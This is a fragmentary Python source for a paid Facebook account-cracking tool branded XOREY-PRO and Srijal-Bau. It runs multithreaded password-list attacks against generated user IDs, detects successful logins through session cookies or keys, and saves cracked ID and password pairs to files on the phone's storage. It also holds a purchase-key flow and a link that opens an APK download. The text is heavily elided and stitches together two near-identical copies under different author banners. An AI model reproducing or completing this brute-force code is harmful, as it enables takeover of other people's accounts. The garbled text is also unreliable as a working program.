...
----------------------------------------------
 Author    : Th'w Srijal
 Github    : Srijal10
 Facebook  : Th'w Srijal
 Tool Name : Srijal-Bau
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 Srijal Pro version 1.9.8
 For Haters: HATE GARI RAKHH 😆🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/XOREY_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                        ...
                        linex()
                        tks = ("Hi XOREY Sir, I Need To Buy Your Paid XOREY PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python XOREY.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as XOREY:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                XOREY.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [XOREY-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        XOREY=session.cookies.get_dict().keys()
                        if "c_user" in XOREY:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [XOREY-OK] %s | %s'%(ids,pas))
                                open('/sdcard/XOREY-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in XOREY:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [XOREY-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XOREY-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [XOREY-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/XOREY-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/XOREY-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [XOREY-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/XOREY-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [XOREY-OK] '+uid+' | '+pas+'\033[1;97m')
...
logo=("""\033[1;37m
  .d8b.  db   dD 
 d8' `8b 88 ,8P'   
 88ooo88 88,8P            \033[1;34m𝐏 \033[1;37m
 88~~~88 88`8b        .\033[1;31m 𝐑\033[1;37m
 88   88 88 `88.             \033[1;35m𝐎 \033[1;37m
 YP   YP YP     
----------------------------------------------
 Author    : MANOJ
 Github    : Manoj-1d
 Facebook  : MR.XOREY.GANDO
 Tool Name : XOREY-PRO
 Type type : PAID
 Version   : 1.9.8
----------------------------------------------
 XOREY Pro version 1.9.8
 For Haters: MERO LADO MA CHUPPA HAN AAIJA 🤞
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
